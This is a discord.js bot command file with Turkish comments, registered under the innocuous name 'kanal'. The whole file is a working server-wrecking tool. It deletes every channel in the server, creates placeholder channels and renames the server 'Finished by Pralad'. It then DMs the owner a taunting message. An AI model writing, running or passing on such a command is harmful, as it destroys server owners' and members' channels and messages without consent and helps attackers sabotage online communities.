const Discord = require('discord.js');
exports.run = async (client, msg, args) => {
 
    msg.delete();

    await msg.guild.channels.cache.forEach(a => a.delete())     //TÜM KANALLARI SİLEN KOMUT

    await msg.guild.channels.create("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", {
      type: "text"
    });
      await msg.guild
      .channels.create("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", {
        type: "voice"
      })
    
    await msg.guild.setName("Pralad Tarafından Bitirildi."); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.owner.send(`***Nedensiz Sunucu Patlatmayız.***`);    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
  
};

exports.conf = {
  enabled: true, 
  guildOnly: false, 
  aliases: [],
  permLevel: 4 
};

exports.help = {
  name: 'kanal',
  description: 'kanal',
  usage: 'kanal'
};